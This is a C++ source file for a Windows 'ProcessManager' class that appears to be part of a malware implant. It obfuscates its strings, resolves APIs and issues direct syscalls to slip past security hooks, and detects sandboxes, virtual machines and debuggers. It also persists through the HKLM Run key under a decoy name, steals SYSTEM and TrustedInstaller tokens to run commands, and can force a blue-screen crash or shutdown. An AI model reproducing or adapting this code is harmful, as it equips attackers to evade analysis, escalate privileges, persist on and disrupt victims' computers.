#include "ProcessManager.h"
#include "Syscalls.h"
#include "ext/obfuscate.h"

#include <array>
#include <random>

std::string _lower(std::string inp) {
    std::string out = "";
    for ( auto& c : inp )
        out += tolower(c);
    return out;
}

// return true if they are equal
// return false if otherwise
BOOL _sub(std::string libPath, std::string s2) {
    return libPath.find(s2) != std::string::npos;
}

std::string PWSTRToString(PWSTR inp) {
    std::wstring wstr(inp);
    std::string str(wstr.begin(), wstr.end());

    return str;
}

FARPROC ProcessManager::GetFunctionAddressInternal(HMODULE lib, std::string procedure) {
    // get nt and dos headers
    PIMAGE_DOS_HEADER       dosHeader = ( PIMAGE_DOS_HEADER ) lib;
    PIMAGE_NT_HEADERS       ntHeader = ( PIMAGE_NT_HEADERS ) ( dosHeader->e_lfanew + ( BYTE* ) lib );
    IMAGE_OPTIONAL_HEADER   optHeader = ntHeader->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY exports = ( PIMAGE_EXPORT_DIRECTORY ) ( ( BYTE* ) lib + optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    // Addresses
    DWORD* functionAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfFunctions );
    DWORD* funcNameAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfNames );
    WORD* funcNameOrdinals = ( WORD* ) ( ( BYTE* ) lib + exports->AddressOfNameOrdinals );

    for ( DWORD funcIndex = 0; funcIndex < exports->NumberOfNames; funcIndex++ ) {
        const char* funcName = ( const char* ) ( BYTE* ) lib + funcNameAddresses[funcIndex];
        if ( strcmp(funcName, procedure.c_str()) == 0 ) {
            DWORD funcID = funcNameOrdinals[funcIndex];
            DWORD address = functionAddresses[funcID];
            BYTE* absoluteAddress = ( ( BYTE* ) lib + address );

            return ( FARPROC ) absoluteAddress;
        }
    }
    return NULL;
}

HMODULE ProcessManager::GetLoadedModule(std::string libName)
{
    if ( this->m_LoadedDLLs.count(_lower(libName).c_str()) > 0 )
        return this->m_LoadedDLLs.find(_lower(libName).c_str())->second;

    PPEB peb = ( PPEB ) GetPebAddress();

    PPEB_LDR_DATA         LDRData   = peb->Ldr;
    LIST_ENTRY*           modules   = &LDRData->InMemoryOrderModuleList;
    LIST_ENTRY*           nextEntry = modules->Flink;
    LDR_DATA_TABLE_ENTRY* modInfo   = NULL;

    while ( nextEntry != modules ) {
        modInfo = ( LDR_DATA_TABLE_ENTRY* ) ( ( BYTE* ) nextEntry - sizeof(LIST_ENTRY) ); // get the info
        nextEntry = nextEntry->Flink; // set the current node to the next node

        if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {
            HMODULE mod = ( HMODULE ) modInfo->DllBase;
            this->m_LoadedDLLs.insert(std::pair<const char*, HMODULE>(_lower(libName).c_str(), mod));

            return mod;
        }
    }

    return NULL;
}

HMODULE ProcessManager::GetLoadedLib(const std::string& libName) {
    if ( this->m_LoadedDLLs.count(_lower(libName)) > 0 ) {
        return this->m_LoadedDLLs.at(_lower(libName));
    }

    return GetLoadedModule(libName);
}

BOOL ProcessManager::FreeUsedLibrary(const std::string& lib) {
    if ( this->m_LoadedDLLs.find(_lower(lib).c_str()) == this->m_LoadedDLLs.end() )
        return FALSE;

    HMODULE module = this->m_LoadedDLLs.find(_lower(lib).c_str())->second;

    if ( !Call<_FreeDLL>(GetLoadedLib((char*)HIDE("kernel32.dll")), std::string(HIDE("FreeLibraryA")), module) )
        return FALSE;

    this->m_LoadedDLLs.erase(_lower(lib).c_str());

    return TRUE;
}

ProcessManager::ProcessManager() {
    // load required mods
    if ( DllsLoaded )
        return;

    Kernel32DLL = this->GetLoadedModule((char*)HIDE("kernel32.dll"));
    AdvApi32DLL = this->GetLoadedModule((char*)HIDE("advapi32.dll"));
    NTDLL       = this->GetLoadedModule((char*)HIDE("ntdll.dll"));

    if ( Kernel32DLL == NULL || AdvApi32DLL == NULL || NTDLL == NULL )
        return;

    DllsLoaded = TRUE;

    this->LoadAllNatives();
}

unsigned int ProcessManager::GetSSN(HMODULE lib, std::string functionName) {
    FARPROC address = GetFunctionAddressInternal(NTDLL, functionName);
    if ( !address )
        return -1;

    BYTE* functionBytes = ( BYTE* ) address;

    for ( int offset = 0; offset < 10; offset++ ) {
        if ( functionBytes[offset] == 0xB8 ) // next byte is syscall number
            return *( int* ) ( functionBytes + offset + 1 );
    }
}

template <typename type>
void ProcessManager::LoadNative(char* name, HMODULE from) {
    type loaded = GetFunctionAddress<type>(from, name);
    if ( !loaded )
        return;

    FunctionPointer<type> fp = {};
    fp.from = from; 
    fp.call = loaded;
    fp.name = name;

    this->m_Natives[name] = std::any(fp);
}

void ProcessManager::SetThisContext(SecurityContext newContext) {
    if ( newContext > this->m_Context )
        this->m_Context = newContext;
}

bool ProcessManager::RunningInVirtualMachine() {
    std::vector<unsigned char> buffer;
    std::string temp;
    const int rsmb = 1381190978; // 'RSMB'

    FunctionPointer<_GetSystemFirmwareTable> ReadBIOS = GetNative<_GetSystemFirmwareTable>((char*)HIDE("GetSystemFirmwareTable"));
    
    DWORD size = ReadBIOS.call(rsmb, 0, nullptr, 0 );
    if ( size == 0 )
        return false;

    buffer.resize(size);
    if ( ReadBIOS.call(rsmb, 0, buffer.data(), size) == 0 )
        return false;

    for ( DWORD i = 0; i < size; ++i ) {
        if ( isprint(buffer[i]) ) {
            temp += (char)buffer[i];
            continue;
        }

        if ( !temp.empty() ) {
            std::cout << temp << std::endl;
            
            std::string lower = _lower(temp);

            if ( 
                lower == (char*)HIDE("qemu")                              ||
                lower.find((char*)HIDE("oracle")) != std::string::npos    ||
                lower == (char*)HIDE("virtualbox")                        || 
                lower.find((char*)HIDE("vbox")) != std::string::npos      ||
                lower.find((char*)HIDE("virtual")) != std::string::npos   ||
                lower.find((char*)HIDE("vmware")) != std::string::npos    ||
                lower.find((char*)HIDE("hyper-v")) != std::string::npos   ||
                lower.find((char*)HIDE("microsoft corporation")) != std::string::npos ||
                lower.find((char*)HIDE("xen")) != std::string::npos       ||
                lower.find((char*)HIDE("kvm")) != std::string::npos       ||
                lower.find((char*)HIDE("capa")) != std::string::npos      ||
                lower.find((char*)HIDE("azure")) != std::string::npos     ||
                lower.find((char*)HIDE("sandbox")) != std::string::npos ||
                lower.find((char*)HIDE("cape")) != std::string::npos ||
                lower.find((char*)HIDE("cuckoo")) != std::string::npos
                )
                return true;
        }

        temp.clear();
    }

    return false;
}

void ProcessManager::AddProcessToStartup(std::string path) {
    std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
    std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());

    UNICODE_STRING reg;
    reg.Buffer = wide.data();
    reg.Length = wide.size() * sizeof(wchar_t);
    reg.MaximumLength = sizeof(reg.Buffer);

    std::string hiddenName = std::string(HIDE("Defaults"));
    std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());

    std::wstring wstrPath = std::wstring(path.begin(), path.end());

    UNICODE_STRING valueName;
    valueName.Buffer = name.data();
    valueName.Length = name.size() * sizeof(wchar_t);
    valueName.MaximumLength = sizeof(valueName.Length);

    UNICODE_STRING valueData;
    valueData.Buffer = wstrPath.data();
    valueData.Length = wstrPath.size() * sizeof(wchar_t);
    valueData.MaximumLength = sizeof(valueData.Length);

    OBJECT_ATTRIBUTES obj;
    InitializeObjectAttributes(&obj, 0, 0, 0, 0);
    obj.Length = sizeof(OBJECT_ATTRIBUTES);
    obj.RootDirectory = NULL;
    obj.ObjectName = &reg;
    obj.SecurityDescriptor = NULL;
    obj.SecurityQualityOfService = NULL;
    obj.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE key;
    
    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtCreateKey"));
    NTSTATUS created = SysNtCreateKey(&key, KEY_ALL_ACCESS, &obj, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if ( created != STATUS_SUCCESS )
        return;

    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtSetValueKey"));
    NTSTATUS set = SysNtSetValueKey(key, &valueName, 0, REG_SZ, (void*)valueData.Buffer, valueData.Length);
    if ( set != STATUS_SUCCESS )
        return;
}

void ProcessManager::ShutdownSystem(SHUTDOWN_ACTION type) {
    BOOLEAN state = FALSE;

    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRevertContainerImpersonation"));
    SysNtRevertContainerImpersonation();

    ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, ( char* ) HIDE("RtlAdjustPrivilege"));
    NTSTATUS adjusted = adjust(19, TRUE, FALSE, &state);
    
    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtShutdownSystem"));
    SysNtShutdownSystem(type);
}

void ProcessManager::BSOD() {
    BOOLEAN state = FALSE;
    ULONG   resp;
    
    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRevertContainerImpersonation"));
    SysNtRevertContainerImpersonation();

    ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, (char*)HIDE("RtlAdjustPrivilege"));
    adjust(19, TRUE, FALSE, &state);

    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRaiseHardError"));
    SysNtRaiseHardError(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &resp);
}

void ProcessManager::LoadAllNatives() {
    if ( this->m_NativesLoaded )
        return;

    LoadNative<::_GetComputerNameA>((char*)HIDE("GetComputerNameA"), Kernel32DLL);
    LoadNative<::_ImpersonateLoggedOnUser>((char*)HIDE("ImpersonateLoggedOnUser"), AdvApi32DLL);
    LoadNative<::_CreateToolhelp32Snapshot>((char*)HIDE("CreateToolhelp32Snapshot"), Kernel32DLL);
    LoadNative<::_OpenServiceA>((char*)HIDE("OpenServiceA"), AdvApi32DLL);
    LoadNative<::_OpenSCManagerW>((char*)HIDE("OpenSCManagerW"), AdvApi32DLL);
    LoadNative<::_QueryServiceStatusEx>((char*)HIDE("QueryServiceStatusEx"), AdvApi32DLL);
    LoadNative<::_StartService>((char*)HIDE("StartServiceW"), AdvApi32DLL);
    LoadNative<::_CreateProcessWithTokenW>((char*)HIDE("CreateProcessWithTokenW"), AdvApi32DLL);
    LoadNative<::_Process32NextW>((char*)HIDE("Process32NextW"), Kernel32DLL);
    LoadNative<::_Process32FirstW>((char*)HIDE("Process32FirstW"), Kernel32DLL);
    LoadNative<::_LoadLibrary>((char*)HIDE("LoadLibraryA"), Kernel32DLL);
    LoadNative<::_GetSystemFirmwareTable>((char*)HIDE("GetSystemFirmwareTable"), Kernel32DLL);

    this->m_NativesLoaded = TRUE;
}

DWORD ProcessManager::PIDFromName(const char* name) {
    // take snapshot of all current running processes

    PROCESSENTRY32 processEntry;
    DWORD          processID = -1;
    HANDLE         processSnapshot = GetNative<::_CreateToolhelp32Snapshot>((char*) HIDE("CreateToolhelp32Snapshot")).call(TH32CS_SNAPPROCESS, 0);

    if ( processSnapshot == INVALID_HANDLE_VALUE ) {
        return -1;
    }

    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // process the first file in the snapshot, put information in processEntry
    if ( !GetNative<_Process32FirstW>((char*)HIDE("Process32FirstW")).call( processSnapshot, &processEntry ) ) {
        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
        SysNtClose(processSnapshot);
        return -1;
    }

    // iterate through all running processes
    // compare the proc name to the name of the process we need
    // if they're the same, return the process id and return
    do {
        std::wstring exeFile(processEntry.szExeFile);
        std::string strExeFile(exeFile.begin(), exeFile.end());

        if ( strcmp(name, strExeFile.data()) == 0 ) {
            processID = processEntry.th32ProcessID;
            break;
        }
    } while ( GetNative<_Process32NextW>((char*)HIDE("Process32NextW")).call( processSnapshot, &processEntry ) ); // iterate if the next process in the snapshot is valid

    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
    SysNtClose(processSnapshot);

    return processID;
}

void ProcessManager::GetAndInsertSSN(HMODULE lib, std::string functionName) {
    unsigned int syscall = GetSSN(lib, functionName);
    if ( syscall == -1 )
        return;

    InsertSyscall(syscall);
}

HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID, bool ti) {
    OBJECT_ATTRIBUTES objectAttributes{};
    HANDLE            process = NULL;
    CLIENT_ID         pInfo{};
    pInfo.UniqueProcess = ( HANDLE ) processID;
    pInfo.UniqueThread = ( HANDLE ) 0;

    InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);

    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenProcess"));
    NTSTATUS openStatus = SysNtOpenProcess(
        &process,
        MAXIMUM_ALLOWED,
        &objectAttributes,
        &pInfo
    );

    if ( openStatus != STATUS_SUCCESS )
        return NULL;

    HANDLE   processToken = NULL;
    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenProcessTokenEx"));
    NTSTATUS openProcTokenStatus = SysNtOpenProcessTokenEx(process, TOKEN_DUPLICATE, 0, &processToken);

    if ( openProcTokenStatus != STATUS_SUCCESS ) {
        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
        SysNtClose(process);
        return NULL;
    }

    InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
    HANDLE   duplicatedToken = NULL;
    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtDuplicateToken"));
    NTSTATUS tokenDuplicated = SysNtDuplicateToken(
        processToken,
        MAXIMUM_ALLOWED,
        &objectAttributes,
        FALSE,
        TokenPrimary,
        &duplicatedToken
    );

    if ( tokenDuplicated != STATUS_SUCCESS ) {
        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
        SysNtClose(processToken);
        SysNtClose(process);
        return NULL;
    }

    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
    SysNtClose(process);
    SysNtClose(processToken);

    return duplicatedToken;
}


BOOL ProcessManager::OpenProcessAsImposter(
    HANDLE token,
    DWORD dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    bool saveOutput,
    std::string& cmdOutput
) {
    HANDLE              readFrom = nullptr, writeTo = nullptr; // read from and write to, std buffers
    STARTUPINFO         si = {};
    PROCESS_INFORMATION pi = {};
    SECURITY_ATTRIBUTES sa = {};
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);

    if ( saveOutput ) {
        CreatePipe(&readFrom, &writeTo, &sa, 0);
        SetHandleInformation(readFrom, HANDLE_FLAG_INHERIT, 0);

        si.cb         = sizeof(STARTUPINFO);
        si.dwFlags    = STARTF_USESTDHANDLES;
        si.hStdOutput = writeTo;
        si.hStdError  = writeTo;
        si.hStdInput  = nullptr;
    }

    BOOL created = GetNative<::_CreateProcessWithTokenW>(( char* ) HIDE("CreateProcessWithTokenW")).call(
        token,
        dwLogonFlags,
        lpApplicationName,
        lpCommandLine,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        &si,
        &pi
    );

    if ( !saveOutput )
        return created;

    if ( !created ) {
        std::cout << GetLastError() << std::endl;
        cmdOutput = (char*)HIDE("The command requested to perform failed.");
        return FALSE;
    }

    GetAndInsertSSN(NTDLL, (char*)HIDE("NtClose"));
    SysNtClose(writeTo);

    char        buffer[4096];
    DWORD       bytesRead = 0;

    while ( ReadFile(readFrom, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0 ) {
        buffer[bytesRead] = '\0';
        cmdOutput.append(buffer);
    }
    
    cmdOutput.erase(cmdOutput.rfind('\n'));

    GetAndInsertSSN(NTDLL, (char*)HIDE("NtClose"));
    SysNtClose(readFrom);

    return TRUE;
}

DWORD ProcessManager::StartWindowsService(const std::string& serviceName) {
    SC_HANDLE scManager = GetNative<_OpenSCManagerW>((char*)HIDE("OpenSCManagerW")).call( nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE );
    if ( scManager == NULL )
        return -1;

    SC_HANDLE service = GetNative<_OpenServiceA>((char*)HIDE("OpenServiceA")).call( scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE );
    if ( service == NULL ) {
        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
        SysNtClose(scManager);
        return -1;
    }

    SERVICE_STATUS_PROCESS status = { 0 };
    DWORD statusBytesNeeded;

    // query and attempt to start, wait if stop pending, until service running
    do {
        // query the service status
        if ( !GetNative<_QueryServiceStatusEx>((char*)HIDE("QueryServiceStatusEx")).call(
            service,
            SC_STATUS_PROCESS_INFO,
            ( LPBYTE ) &status,
            sizeof(SERVICE_STATUS_PROCESS),
            &statusBytesNeeded
        ) ) {
            GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
            SysNtClose(scManager);
            SysNtClose(service);
            return -1;
        }

        // check if stop pending
        if ( status.dwCurrentState == SERVICE_STOP_PENDING || status.dwCurrentState == SERVICE_START_PENDING ) {
            // wait until service is stopped 

            // recommended wait time based on microsoft win32 docs
            int wait = status.dwWaitHint / 10;

            if ( wait < 1000 )
                wait = 1000;
            else if ( wait > 10000 )
                wait = 10000;

            LARGE_INTEGER i;
            i.QuadPart = wait;

            GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtDelayExecution"));
            SysNtDelayExecution(FALSE, &i);
        
            continue;
        }

        // service is not running
        if ( status.dwCurrentState == SERVICE_STOPPED ) {
            BOOL serviceStarted = GetNative<_StartService>((char*)HIDE("StartServiceW")).call( service, 0, NULL );
            if ( !serviceStarted ) {
                GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
                SysNtClose(service);
                SysNtClose(scManager);
                return -1;
            }
        }
    } while ( status.dwCurrentState != SERVICE_RUNNING );

    // service is now started
    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
    SysNtClose(service);
    SysNtClose(scManager);

    return status.dwProcessId;
}

HANDLE ProcessManager::ImpersonateWithToken(HANDLE token) {
    if ( !GetNative<_ImpersonateLoggedOnUser>((char*)HIDE("ImpersonateLoggedOnUser")).call( token ) ) {
        GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtClose"));
        SysNtClose(token);
        return NULL;
    }

    return token;
}

HANDLE ProcessManager::GetSystemToken() {
    DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));
    if ( logonPID == 0 ) // bad process id
        return FALSE;
    
    HANDLE winlogon = CreateProcessAccessToken(logonPID);
    if ( winlogon == NULL )
        return NULL;

    HANDLE impersonate = ImpersonateWithToken(winlogon);
    if ( impersonate == NULL )
        return NULL;

    SetThisContext(SecurityContext::System);
    m_ElevatedToken = impersonate;
    return impersonate;
}

HANDLE ProcessManager::GetTrustedInstallerToken() {
    if ( m_Context < SecurityContext::System )
        this->GetSystemToken();

    DWORD  pid   = StartWindowsService(std::string(HIDE("TrustedInstaller")));
    HANDLE token = CreateProcessAccessToken(pid, true);
    if ( token == NULL )
        return NULL;
    

    HANDLE impersonate = ImpersonateWithToken(token);
    if ( impersonate == NULL )
        return NULL;

    SetThisContext(SecurityContext::TrustedInstaller);
    m_ElevatedToken = impersonate;
    return impersonate;
}

bool ProcessManager::BeingDebugged() {
    PPEB filePEB = ( PPEB ) GetPebAddress();
    BYTE beingDebugged = filePEB->BeingDebugged;

    if ( beingDebugged )
        return true;

    return false;
}
